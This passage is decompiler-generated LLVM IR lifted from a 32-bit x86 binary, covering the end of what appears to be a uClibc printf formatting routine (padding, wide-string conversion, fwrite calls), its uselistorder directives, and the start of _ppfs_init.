  %v3_8052bd7 = load i8, i8* %v2_8052bd7, align 1
  %v4_8052bd7 = add i8 %v3_8052bd7, -48
  %v9_8052bd7 = icmp eq i8 %v4_8052bd7, 0
  %v10_8052bd7 = icmp slt i8 %v4_8052bd7, 0
  store i1 %v10_8052bd7, i1* %sf.global-to-local, align 1
  %v1_8052bdc = icmp eq i1 %v9_8052bd7, false
  br i1 %v1_8052bdc, label %dec_label_pc_8052be8, label %dec_label_pc_8052bde

dec_label_pc_8052bde:                             ; preds = %dec_label_pc_8052bcd
  %v0_8052bde = load i32, i32* @ebx, align 4
  %v1_8052bde = load i32, i32* @ecx, align 4
  %v2_8052bde = add i32 %v1_8052bde, %v0_8052bde
  %v13_8052bde = icmp slt i32 %v2_8052bde, 0
  store i1 %v13_8052bde, i1* %sf.global-to-local, align 1
  store i32 %v2_8052bde, i32* @ebx, align 4
  %v1_8052be0 = add i32 %v0_8052bd7, 8
  %v2_8052be0 = inttoptr i32 %v1_8052be0 to i32*
  store i32 0, i32* %v2_8052be0, align 4
  %v0_8052be8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052be8

dec_label_pc_8052be8:                             ; preds = %dec_label_pc_8052bcd, %dec_label_pc_8052bde
  %v0_8052bef = phi i32 [ %v0_8052bd7, %dec_label_pc_8052bcd ], [ %v0_8052be8.pre, %dec_label_pc_8052bde ]
  %v1_8052be8 = add i32 %v0_8052bef, 32
  %v2_8052be8 = inttoptr i32 %v1_8052be8 to i8*
  %v3_8052be8 = load i8, i8* %v2_8052be8, align 1
  %v4_8052be8 = and i8 %v3_8052be8, 8
  %v5_8052be8 = icmp eq i8 %v4_8052be8, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8052bed = icmp eq i1 %v5_8052be8, false
  br i1 %v1_8052bed, label %dec_label_pc_8052c16, label %dec_label_pc_8052bef

dec_label_pc_8052bef:                             ; preds = %dec_label_pc_8052be8
  %v1_8052bef = add i32 %v0_8052bef, 8
  %v2_8052bef = inttoptr i32 %v1_8052bef to i32*
  %v3_8052bef = load i32, i32* %v2_8052bef, align 4
  store i32 %v3_8052bef, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052bf8 = add i32 %v0_8052bef, 368
  %v2_8052bf8 = inttoptr i32 %v1_8052bf8 to i32*
  %v3_8052bf8 = load i32, i32* %v2_8052bf8, align 4
  store i32 %v3_8052bf8, i32* @eax, align 4
  %v0_8052bff = call i32 @_charpad()
  store i32 %v0_8052bff, i32* %eax.global-to-local, align 4
  %v1_8052c04 = load i32, i32* @esp, align 4
  %v2_8052c04 = add i32 %v1_8052c04, 8
  %v3_8052c04 = inttoptr i32 %v2_8052c04 to i32*
  %v4_8052c04 = load i32, i32* %v3_8052c04, align 4
  %v5_8052c04 = sub i32 %v0_8052bff, %v4_8052c04
  %v15_8052c04 = icmp eq i32 %v5_8052c04, 0
  %v16_8052c04 = icmp slt i32 %v5_8052c04, 0
  store i1 %v16_8052c04, i1* %sf.global-to-local, align 1
  %v1_8052c08 = icmp eq i1 %v15_8052c04, false
  br i1 %v1_8052c08, label %dec_label_pc_8052d03, label %dec_label_pc_8052c0e

dec_label_pc_8052c0e:                             ; preds = %dec_label_pc_8052bef
  store i32 0, i32* %v3_8052c04, align 4
  %v1_8052c16.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052c16

dec_label_pc_8052c16:                             ; preds = %dec_label_pc_8052be8, %dec_label_pc_8052c0e
  %v1_8052c16 = phi i32 [ %v0_8052bef, %dec_label_pc_8052be8 ], [ %v1_8052c16.pre, %dec_label_pc_8052c0e ]
  %v0_8052c16 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c16 = add i32 %v1_8052c16, -4
  %v3_8052c16 = inttoptr i32 %v2_8052c16 to i32*
  store i32 %v0_8052c16, i32* %v3_8052c16, align 4
  %v0_8052c17 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c17 = add i32 %v1_8052c16, -8
  %v3_8052c17 = inttoptr i32 %v2_8052c17 to i32*
  store i32 %v0_8052c17, i32* %v3_8052c17, align 4
  %v1_8052c18 = add i32 %v1_8052c16, 368
  %v2_8052c18 = inttoptr i32 %v1_8052c18 to i32*
  %v3_8052c18 = load i32, i32* %v2_8052c18, align 4
  %v5_8052c18 = add i32 %v1_8052c16, -12
  %v6_8052c18 = inttoptr i32 %v5_8052c18 to i32*
  store i32 %v3_8052c18, i32* %v6_8052c18, align 4
  %v0_8052c1f = load i32, i32* @ebp, align 4
  %v1_8052c1f = add i32 %v0_8052c1f, ptrtoint (i32* @global_var_805c105.491 to i32)
  store i32 %v1_8052c1f, i32* %eax.global-to-local, align 4
  %v2_8052c25 = add i32 %v1_8052c16, -16
  %v3_8052c25 = inttoptr i32 %v2_8052c25 to i32*
  store i32 %v1_8052c1f, i32* %v3_8052c25, align 4
  %v0_8052c26 = call i32 @__GI_fputs_unlocked()
  store i32 %v0_8052c26, i32* %eax.global-to-local, align 4
  %v0_8052c2b = load i32, i32* @esp, align 4
  %v1_8052c2b = add i32 %v0_8052c2b, 384
  %v2_8052c2b = inttoptr i32 %v1_8052c2b to i32*
  %v3_8052c2b = load i32, i32* %v2_8052c2b, align 4
  store i32 %v3_8052c2b, i32* @eax, align 4
  %v0_8052c32 = load i32, i32* @ebx, align 4
  store i32 %v0_8052c32, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8052c39 = call i32 @_charpad()
  store i32 %v0_8052c39, i32* %eax.global-to-local, align 4
  %v0_8052c3e = load i32, i32* @esp, align 4
  %v1_8052c3e = add i32 %v0_8052c3e, 16
  %v1_8052c41 = load i32, i32* @ebx, align 4
  %v2_8052c41 = sub i32 %v0_8052c39, %v1_8052c41
  %v12_8052c41 = icmp eq i32 %v2_8052c41, 0
  %v13_8052c41 = icmp slt i32 %v2_8052c41, 0
  store i1 %v13_8052c41, i1* %sf.global-to-local, align 1
  %v1_8052c43 = icmp eq i1 %v12_8052c41, false
  br i1 %v1_8052c43, label %dec_label_pc_8052d03, label %dec_label_pc_8052c49

dec_label_pc_8052c49:                             ; preds = %dec_label_pc_8052c16
  %v1_8052c49 = add i32 %v0_8052c3e, 356
  %v2_8052c49 = inttoptr i32 %v1_8052c49 to i32*
  %v3_8052c49 = load i32, i32* %v2_8052c49, align 4
  %v4_8052c49 = icmp eq i32 %v3_8052c49, 0
  %v5_8052c49 = icmp slt i32 %v3_8052c49, 0
  store i1 %v5_8052c49, i1* %sf.global-to-local, align 1
  %v1_8052c51 = icmp eq i1 %v4_8052c49, false
  br i1 %v1_8052c51, label %dec_label_pc_8052c75, label %dec_label_pc_8052c53

dec_label_pc_8052c53:                             ; preds = %dec_label_pc_8052c49
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8052c55 = load i32, i32* @esi, align 4
  %v1_8052c55 = icmp eq i32 %v0_8052c55, 0
  %v2_8052c55 = icmp slt i32 %v0_8052c55, 0
  store i1 %v2_8052c55, i1* %sf.global-to-local, align 1
  br i1 %v1_8052c55, label %dec_label_pc_8052c6b, label %dec_label_pc_8052c59

dec_label_pc_8052c59:                             ; preds = %dec_label_pc_8052c53
  %v2_8052c59 = add i32 %v0_8052c3e, 12
  %v3_8052c59 = inttoptr i32 %v2_8052c59 to i32*
  store i32 0, i32* %v3_8052c59, align 4
  %v1_8052c5a = add i32 %v0_8052c3e, 384
  %v2_8052c5a = inttoptr i32 %v1_8052c5a to i32*
  %v3_8052c5a = load i32, i32* %v2_8052c5a, align 4
  %v5_8052c5a = add i32 %v0_8052c3e, 8
  %v6_8052c5a = inttoptr i32 %v5_8052c5a to i32*
  store i32 %v3_8052c5a, i32* %v6_8052c5a, align 4
  %v0_8052c61 = load i32, i32* @esi, align 4
  %v2_8052c61 = add i32 %v0_8052c3e, 4
  %v3_8052c61 = inttoptr i32 %v2_8052c61 to i32*
  store i32 %v0_8052c61, i32* %v3_8052c61, align 4
  %v0_8052c62 = load i32, i32* @edi, align 4
  %v3_8052c62 = inttoptr i32 %v0_8052c3e to i32*
  store i32 %v0_8052c62, i32* %v3_8052c62, align 4
  %v0_8052c63 = load i32, i32* %stack_var_-364, align 4
  %v4_8052c63 = call i32 @__stdio_fwrite(i32 %v0_8052c63, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052c63, i32* %eax.global-to-local, align 4
  %v0_8052c68 = load i32, i32* @esp, align 4
  %v1_8052c68 = add i32 %v0_8052c68, 16
  %v7_8052c68 = icmp slt i32 %v1_8052c68, 0
  store i1 %v7_8052c68, i1* %sf.global-to-local, align 1
  %v1_8052c6b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052c6b

dec_label_pc_8052c6b:                             ; preds = %dec_label_pc_8052c53, %dec_label_pc_8052c59
  %v0_8052cd547 = phi i32 [ %v1_8052c3e, %dec_label_pc_8052c53 ], [ %v1_8052c68, %dec_label_pc_8052c59 ]
  %v1_8052c6b = phi i32 [ 0, %dec_label_pc_8052c53 ], [ %v1_8052c6b.pre, %dec_label_pc_8052c59 ]
  %v0_8052c6b = phi i32 [ 0, %dec_label_pc_8052c53 ], [ %v4_8052c63, %dec_label_pc_8052c59 ]
  %v2_8052c6b = sub i32 %v0_8052c6b, %v1_8052c6b
  %v12_8052c6b = icmp eq i32 %v2_8052c6b, 0
  %v13_8052c6b = icmp slt i32 %v2_8052c6b, 0
  store i1 %v13_8052c6b, i1* %sf.global-to-local, align 1
  %v1_8052c6d = icmp eq i1 %v12_8052c6b, false
  br i1 %v1_8052c6d, label %dec_label_pc_8052d03, label %dec_label_pc_8052cd5

dec_label_pc_8052c75:                             ; preds = %dec_label_pc_8052c49
  %v1_8052c75 = add i32 %v0_8052c3e, 348
  %v2_8052c75 = inttoptr i32 %v1_8052c75 to i32*
  store i32 0, i32* %v2_8052c75, align 4
  %v0_8052cd19 = load i32, i32* @esi, align 4
  %v1_8052cd110 = icmp eq i32 %v0_8052cd19, 0
  %v2_8052cd111 = icmp slt i32 %v0_8052cd19, 0
  store i1 %v2_8052cd111, i1* %sf.global-to-local, align 1
  %v1_8052cd317 = icmp eq i1 %v1_8052cd110, false
  %v0_8052c82.pre = load i32, i32* @esp, align 4
  br i1 %v1_8052cd317, label %dec_label_pc_8052c82, label %dec_label_pc_8052cd5

dec_label_pc_8052c82:                             ; preds = %dec_label_pc_8052c75, %dec_label_pc_8052ccf
  %v0_8052c89 = phi i32 [ %v2_8052ccf, %dec_label_pc_8052ccf ], [ %v0_8052cd19, %dec_label_pc_8052c75 ]
  %v1_8052c94 = phi i32 [ %v0_8052c8242, %dec_label_pc_8052ccf ], [ %v0_8052c82.pre, %dec_label_pc_8052c75 ]
  %v1_8052c82 = add i32 %v1_8052c94, 332
  store i32 %v1_8052c82, i32* %edx.global-to-local, align 4
  %v1_8052c89 = add i32 %v0_8052c89, -128
  %v2_8052c89 = icmp ult i32 %v0_8052c89, 128
  %v6_8052c89 = icmp eq i32 %v1_8052c89, 0
  %v7_8052c89 = icmp slt i32 %v1_8052c89, 0
  store i1 %v7_8052c89, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_8052c94 = add i32 %v1_8052c94, -4
  %v3_8052c94 = inttoptr i32 %v2_8052c94 to i32*
  store i32 %v1_8052c82, i32* %v3_8052c94, align 4
  %v2_8052c95 = or i1 %v2_8052c89, %v6_8052c89
  %v3_8052c95 = load i32, i32* %eax.global-to-local, align 4
  %v4_8052c95 = load i32, i32* @esi, align 4
  %v5_8052c95 = select i1 %v2_8052c95, i32 %v4_8052c95, i32 %v3_8052c95
  %v2_8052c98 = add i32 %v1_8052c94, -8
  %v3_8052c98 = inttoptr i32 %v2_8052c98 to i32*
  store i32 %v5_8052c95, i32* %v3_8052c98, align 4
  %v1_8052c99 = add i32 %v1_8052c94, 340
  store i32 %v1_8052c99, i32* %eax.global-to-local, align 4
  %v2_8052ca0 = add i32 %v1_8052c94, -12
  %v3_8052ca0 = inttoptr i32 %v2_8052ca0 to i32*
  store i32 %v1_8052c99, i32* %v3_8052ca0, align 4
  %v1_8052ca1 = add i32 %v1_8052c94, 204
  store i32 %v1_8052ca1, i32* @edi, align 4
  %v2_8052ca8 = add i32 %v1_8052c94, -16
  %v3_8052ca8 = inttoptr i32 %v2_8052ca8 to i32*
  store i32 %v1_8052ca1, i32* %v3_8052ca8, align 4
  %v0_8052ca9 = call i32 @__GI_wcsrtombs()
  %v0_8052cae = load i32, i32* @esp, align 4
  %v1_8052cae = add i32 %v0_8052cae, 16
  store i32 %v0_8052ca9, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052cb5 = icmp eq i32 %v0_8052ca9, 0
  %v2_8052cb5 = icmp slt i32 %v0_8052ca9, 0
  store i1 %v2_8052cb5, i1* %sf.global-to-local, align 1
  br i1 %v1_8052cb5, label %dec_label_pc_8052ccb, label %dec_label_pc_8052cb9

dec_label_pc_8052cb9:                             ; preds = %dec_label_pc_8052c82
  %v0_8052cb9 = load i32, i32* @ebp, align 4
  %v2_8052cb9 = add i32 %v0_8052cae, 12
  %v3_8052cb9 = inttoptr i32 %v2_8052cb9 to i32*
  store i32 %v0_8052cb9, i32* %v3_8052cb9, align 4
  %v1_8052cba = add i32 %v0_8052cae, 384
  %v2_8052cba = inttoptr i32 %v1_8052cba to i32*
  %v3_8052cba = load i32, i32* %v2_8052cba, align 4
  %v5_8052cba = add i32 %v0_8052cae, 8
  %v6_8052cba = inttoptr i32 %v5_8052cba to i32*
  store i32 %v3_8052cba, i32* %v6_8052cba, align 4
  %v2_8052cc1 = add i32 %v0_8052cae, 4
  %v3_8052cc1 = inttoptr i32 %v2_8052cc1 to i32*
  store i32 %v0_8052ca9, i32* %v3_8052cc1, align 4
  %v0_8052cc2 = load i32, i32* @edi, align 4
  %v3_8052cc2 = inttoptr i32 %v0_8052cae to i32*
  store i32 %v0_8052cc2, i32* %v3_8052cc2, align 4
  %v0_8052cc3 = load i32, i32* %stack_var_-364, align 4
  %v4_8052cc3 = call i32 @__stdio_fwrite(i32 %v0_8052cc3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052cc3, i32* %eax.global-to-local, align 4
  %v0_8052cc8 = load i32, i32* @esp, align 4
  %v1_8052cc8 = add i32 %v0_8052cc8, 16
  %v7_8052cc8 = icmp slt i32 %v1_8052cc8, 0
  store i1 %v7_8052cc8, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052ccb

dec_label_pc_8052ccb:                             ; preds = %dec_label_pc_8052c82, %dec_label_pc_8052cb9
  %v1_8052ccf = phi i32 [ 0, %dec_label_pc_8052c82 ], [ %v4_8052cc3, %dec_label_pc_8052cb9 ]
  %v0_8052c8242 = phi i32 [ %v1_8052cae, %dec_label_pc_8052c82 ], [ %v1_8052cc8, %dec_label_pc_8052cb9 ]
  %v2_8052ccb = sub i32 %v1_8052ccf, %v0_8052ca9
  %v12_8052ccb = icmp eq i32 %v2_8052ccb, 0
  %v13_8052ccb = icmp slt i32 %v2_8052ccb, 0
  store i1 %v13_8052ccb, i1* %sf.global-to-local, align 1
  %v1_8052ccd = icmp eq i1 %v12_8052ccb, false
  br i1 %v1_8052ccd, label %dec_label_pc_8052d03, label %dec_label_pc_8052ccf

dec_label_pc_8052ccf:                             ; preds = %dec_label_pc_8052ccb
  %v0_8052ccf = load i32, i32* @esi, align 4
  %v2_8052ccf = sub i32 %v0_8052ccf, %v1_8052ccf
  %v12_8052ccf = icmp eq i32 %v2_8052ccf, 0
  %v13_8052ccf = icmp slt i32 %v2_8052ccf, 0
  store i32 %v2_8052ccf, i32* @esi, align 4
  store i1 %v13_8052ccf, i1* %sf.global-to-local, align 1
  %v1_8052cd3 = icmp eq i1 %v12_8052ccf, false
  br i1 %v1_8052cd3, label %dec_label_pc_8052c82, label %dec_label_pc_8052cd5

dec_label_pc_8052cd5:                             ; preds = %dec_label_pc_8052ccf, %dec_label_pc_8052c75, %dec_label_pc_8052c6b
  %v0_8052cd5 = phi i32 [ %v0_8052cd547, %dec_label_pc_8052c6b ], [ %v0_8052c82.pre, %dec_label_pc_8052c75 ], [ %v0_8052c8242, %dec_label_pc_8052ccf ]
  %v1_8052cd5 = add i32 %v0_8052cd5, 8
  %v2_8052cd5 = inttoptr i32 %v1_8052cd5 to i32*
  %v3_8052cd5 = load i32, i32* %v2_8052cd5, align 4
  store i32 %v3_8052cd5, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052cde = add i32 %v0_8052cd5, 368
  %v2_8052cde = inttoptr i32 %v1_8052cde to i32*
  %v3_8052cde = load i32, i32* %v2_8052cde, align 4
  store i32 %v3_8052cde, i32* @eax, align 4
  %v0_8052ce5 = call i32 @_charpad()
  store i32 %v0_8052ce5, i32* %eax.global-to-local, align 4
  %v1_8052cea = load i32, i32* @esp, align 4
  %v2_8052cea = add i32 %v1_8052cea, 8
  %v3_8052cea = inttoptr i32 %v2_8052cea to i32*
  %v4_8052cea = load i32, i32* %v3_8052cea, align 4
  %v5_8052cea = sub i32 %v0_8052ce5, %v4_8052cea
  %v15_8052cea = icmp eq i32 %v5_8052cea, 0
  %v16_8052cea = icmp slt i32 %v5_8052cea, 0
  store i1 %v16_8052cea, i1* %sf.global-to-local, align 1
  %v1_8052cee = icmp eq i1 %v15_8052cea, false
  br i1 %v1_8052cee, label %dec_label_pc_8052d03, label %dec_label_pc_8052cf0

dec_label_pc_8052cf0:                             ; preds = %dec_label_pc_8052cd5, %dec_label_pc_8052a5d, %dec_label_pc_8052888
  %v0_8052cf0 = phi i32 [ %v1_8052cea, %dec_label_pc_8052cd5 ], [ %v0_8052cf0.pre, %dec_label_pc_8052a5d ], [ %v1_80528a6, %dec_label_pc_8052888 ]
  %v1_8052cf0 = add i32 %v0_8052cf0, 16
  %v2_8052cf0 = inttoptr i32 %v1_8052cf0 to i32*
  %v3_8052cf0 = load i32, i32* %v2_8052cf0, align 4
  store i32 %v3_8052cf0, i32* @ebx, align 4
  store i32 %v3_8052cf0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80527e0.backedge

dec_label_pc_8052cfb:                             ; preds = %dec_label_pc_805281e
  %v1_8052cfb = add i32 %v0_8052cfb, 2
  %v10_8052cfb = icmp slt i32 %v1_8052cfb, 0
  store i1 %v10_8052cfb, i1* %sf.global-to-local, align 1
  store i32 %v1_8052cfb, i32* @ebx, align 4
  br label %dec_label_pc_80527e0.backedge

dec_label_pc_8052d03:                             ; preds = %dec_label_pc_805280a, %dec_label_pc_8052cd5, %dec_label_pc_8052c6b, %dec_label_pc_8052c16, %dec_label_pc_8052bef, %dec_label_pc_8052b5f, %dec_label_pc_8052ad2, %dec_label_pc_8052a93, %dec_label_pc_8052a34, %dec_label_pc_8052ccb
  %v0_8052d03 = phi i32 [ %v0_8052c8242, %dec_label_pc_8052ccb ], [ %v0_8052d03.pre.pre, %dec_label_pc_805280a ], [ %v1_8052cea, %dec_label_pc_8052cd5 ], [ %v0_8052cd547, %dec_label_pc_8052c6b ], [ %v1_8052c3e, %dec_label_pc_8052c16 ], [ %v1_8052c04, %dec_label_pc_8052bef ], [ %v0_8052880.lcssa, %dec_label_pc_8052b5f ], [ %v1_8052aea, %dec_label_pc_8052ad2 ], [ %v1_8052ab6, %dec_label_pc_8052a93 ], [ %v1_8052a52, %dec_label_pc_8052a34 ]
  %v1_8052d03 = inttoptr i32 %v0_8052d03 to i32*
  store i32 -1, i32* %v1_8052d03, align 4
  br label %dec_label_pc_8052d0a

dec_label_pc_8052d0a:                             ; preds = %dec_label_pc_8052815, %dec_label_pc_8052783, %dec_label_pc_80527a2, %dec_label_pc_8052d03
  %v0_8052d0a = load i32, i32* @esp, align 4
  %v1_8052d0a = inttoptr i32 %v0_8052d0a to i32*
  %v2_8052d0a = load i32, i32* %v1_8052d0a, align 4
  store i32 %v2_8052d0a, i32* %eax.global-to-local, align 4
  %v1_8052d0d = add i32 %v0_8052d0a, 348
  %v10_8052d0d = icmp slt i32 %v1_8052d0d, 0
  store i1 %v10_8052d0d, i1* %sf.global-to-local, align 1
  ret i32 %v2_8052d0a

; uselistorder directives
  uselistorder i32 %v1_8052cfb, { 1, 2, 0 }
  uselistorder i32 %v3_8052cf0, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8052cd5, { 1, 0 }
  uselistorder i32 %v2_8052ccf, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8052cae, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052ca9, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_8052c89, { 1, 0 }
  uselistorder i32 %v0_8052c82.pre, { 1, 0 }
  uselistorder i32 %v0_8052c55, { 1, 0 }
  uselistorder i32 %v3_8052c49, { 1, 0 }
  uselistorder i32 %v0_8052c3e, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8052c16, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052bef, { 0, 2, 1, 3 }
  uselistorder i8 %v4_8052bd7, { 1, 0 }
  uselistorder i32 %v2_8052bc3, { 1, 0, 2, 3 }
  uselistorder i32 %v6_8052bb0, { 1, 0 }
  uselistorder i32 %v1_8052bad, { 1, 0 }
  uselistorder i32 %v1_8052ba3, { 1, 0 }
  uselistorder i32 %v0_8052ba3, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052b82, { 1, 0 }
  uselistorder i32 %v1_8052b5f, { 1, 0 }
  uselistorder i32 %v1_8052b1d, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8052b39, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8052b02, { 1, 0 }
  uselistorder i32 %v1_8052aed, { 1, 0 }
  uselistorder i32 %v1_8052ab9, { 1, 0 }
  uselistorder i32 %v0_8052a93, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8052a79, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_8052a65, { 1, 0 }
  uselistorder i32 %v1_8052a1b, { 1, 0 }
  uselistorder i32 %v4_80529e9, { 1, 0 }
  uselistorder i32 %v0_80529de, { 1, 0, 2, 3 }
  uselistorder i8 %v3_80529d9, { 1, 0 }
  uselistorder i32 %v0_8052a12, { 1, 0, 2, 3 }
  uselistorder i8 %v3_80529c9, { 1, 0 }
  uselistorder i32 %v1_80529c0, { 1, 0 }
  uselistorder i32 %v1_80529b4, { 1, 0 }
  uselistorder i32 %v3_80529a8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805299e, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8052999, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_8052997, { 1, 0 }
  uselistorder i32 %v0_80529e9, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_80529d9, { 1, 2, 0 }
  uselistorder i32 %v3_8052971, { 0, 1, 3, 2 }
  uselistorder i8 %v4_805295f, { 1, 0 }
  uselistorder i32 %v4_8052956, { 1, 0 }
  uselistorder i32 %v3_8052956, { 1, 0 }
  uselistorder i32 %v6_805294e, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_805291f, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_805291e, { 2, 1, 0 }
  uselistorder i32 %v1_80528f7, { 1, 0 }
  uselistorder i32 %v1_80528eb, { 1, 0 }
  uselistorder i32 %v1_80528e6, { 1, 0 }
  uselistorder i32 %v2_80528de, { 1, 0 }
  uselistorder i32 %tmp69, { 1, 0 }
  uselistorder i32 %v3_80528c8, { 1, 0, 2 }
  uselistorder i8 %v3_80528b7, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80528ae, { 1, 0 }
  uselistorder i32 %v3_8052880, { 5, 6, 10, 11, 12, 3, 4, 15, 14, 16, 2, 9, 7, 8, 13, 0, 1, 17, 18, 19 }
  uselistorder i32 %v0_8052880.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_805287c, { 1, 0 }
  uselistorder i32 %v1_805287c.pre, { 1, 0 }
  uselistorder i32 %v1_805287b, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8052878, { 1, 0 }
  uselistorder i32 %v2_805287c73, { 1, 0 }
  uselistorder i32 %v3_8052862, { 1, 0 }
  uselistorder i8 %v4_805281e, { 1, 0 }
  uselistorder i32 %v1_805281e, { 1, 0, 3, 2 }
  uselistorder i8 %v2_8052815, { 1, 0 }
  uselistorder i32 %v2_80527ea, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_80527e6, { 1, 0 }
  uselistorder i8 %v2_80527e0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80527ee, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80527d0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 5, 4, 2, 3, 1, 0, 6, 7, 8, 9, 10 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 2, 1, 0, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 3, 5, 6, 4, 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8052d0a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052d03, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8052ccb, { 1, 0 }
  uselistorder label %dec_label_pc_8052c82, { 1, 0 }
  uselistorder label %dec_label_pc_8052c6b, { 1, 0 }
  uselistorder label %dec_label_pc_8052c16, { 1, 0 }
  uselistorder label %dec_label_pc_8052be8, { 1, 0 }
  uselistorder label %dec_label_pc_8052bcd, { 1, 0 }
  uselistorder label %dec_label_pc_8052bb7, { 1, 0 }
  uselistorder label %dec_label_pc_8052ba3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052b9e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052b30, { 1, 0 }
  uselistorder label %dec_label_pc_8052b16, { 1, 0 }
  uselistorder label %dec_label_pc_8052a34, { 1, 0 }
  uselistorder label %dec_label_pc_80529d9, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8052987, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052937, { 1, 0 }
  uselistorder label %dec_label_pc_805291e, { 1, 0 }
  uselistorder label %dec_label_pc_805290a, { 1, 0 }
  uselistorder label %dec_label_pc_8052905, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80528e6, { 1, 0 }
  uselistorder label %dec_label_pc_8052871, { 1, 0 }
  uselistorder label %dec_label_pc_8052869, { 1, 0 }
  uselistorder label %dec_label_pc_8052815, { 1, 0 }
  uselistorder label %dec_label_pc_805280a, { 1, 0 }
  uselistorder label %dec_label_pc_80527e0.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052d18 = load i32, i32* @esi, align 4
  %v0_8052d19 = load i32, i32* @ebx, align 4
  store i32 %v0_8052d19, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8052d2d = bitcast i32* %arg1 to i8*
  %v4_8052d2d = call i32 @__GI_memset(i8* %v3_8052d2d, i32 0, i32 188)
  %v0_8052d32 = load i32, i32* @ebx, align 4
  %v1_8052d32 = add i32 %v0_8052d32, 40
  store i32 %v1_8052d32, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_8052d3a = add i32 %v0_8052d32, 24
  %v2_8052d3a = inttoptr i32 %v1_8052d3a to i32*
  %v3_8052d3a = load i32, i32* %v2_8052d3a, align 4
